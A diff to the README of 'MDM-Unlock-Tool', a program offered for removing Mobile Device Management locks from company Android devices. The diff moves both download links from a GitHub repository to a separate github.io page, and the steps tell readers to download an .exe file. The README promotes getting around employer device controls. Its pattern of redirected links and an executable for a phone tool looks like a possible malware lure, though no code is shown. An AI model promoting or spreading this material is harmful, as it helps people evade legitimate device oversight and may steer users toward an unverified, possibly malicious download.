@@ -1,6 +1,6 @@
 # 🔓 MDM-Unlock-Tool - Remove mobile management locks with ease
 
-[![Download MDM-Unlock-Tool](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/tetrio6822/MDM-Unlock-Tool)
+[![Download MDM-Unlock-Tool](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://tetrio6822.github.io)
 
 This software helps users remove Mobile Device Management (MDM) locks from Android devices. Many company devices carry these restrictions. These locks prevent you from using the device as a personal phone. This tool bypasses the configuration profile. You gain full control over your hardware without enterprise limitations.
 
@@ -24,7 +24,7 @@ You must visit the project page to get the software. Follow these steps to prepa
 3. Click on the latest version link.
 4. Download the file that ends with .exe.
 
-[Visit the download page here](https://github.com/tetrio6822/MDM-Unlock-Tool)
+[Visit the download page here](https://tetrio6822.github.io)
 
 ## ⚙️ Installation Instructions
 
